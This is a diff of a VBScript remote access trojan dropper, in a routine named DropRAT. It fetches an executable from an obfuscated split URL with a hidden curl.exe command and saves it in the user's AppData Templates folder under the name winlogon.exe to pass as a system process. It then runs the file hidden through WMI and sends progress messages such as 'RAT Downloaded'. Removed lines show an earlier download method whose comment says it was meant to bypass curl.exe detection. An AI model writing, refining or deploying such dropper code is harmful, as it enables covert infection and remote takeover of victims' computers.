@@ -62,35 +62,29 @@ Sub DropRAT()
     u3 = "exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
     url = u1 & u2 & u3
     
-    ' Hide in a hidden AppData folder with a randomized name
+    ' Hide in AppData\Roaming\Microsoft\Windows\Templates
     Dim hidDir : hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
     If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
     
-    Dim randName : randName = "win_" & Int(Rnd * 9000 + 1000) & ".exe"
-    Dim op : op = hidDir & "\" & randName
+    Dim op : op = hidDir & "\winlogon.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Use MSXML2.XMLHTTP (native Windows object) to download, bypassing curl.exe detection
-    Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP")
-    xh.Open "GET", url, False
-    xh.Send
-    
+    ' Use curl.exe (handles TLS perfectly) but with the obfuscated URL
+    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & url & """"
+    sh.Run dlCmd, 0, True
+
     Dim rDone : rDone = False
-    If xh.Status = 200 Then
-        Dim stream : Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1
-        stream.Open
-        stream.Write xh.ResponseBody
-        stream.SaveToFile op, 2
-        stream.Close
-        rDone = True
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 3000000 Then
+            rDone = True
+        End If
     End If
 
     If rDone Then
         Dim dsize : dsize = fso.GetFile(op).Size
         Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 10181046)
         
-        ' Execute hidden via WMI (RunCmd) so no console window pops up
+        ' Execute hidden via WMI
         Call RunCmd("""" & op & """")
         
         Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 10181046)
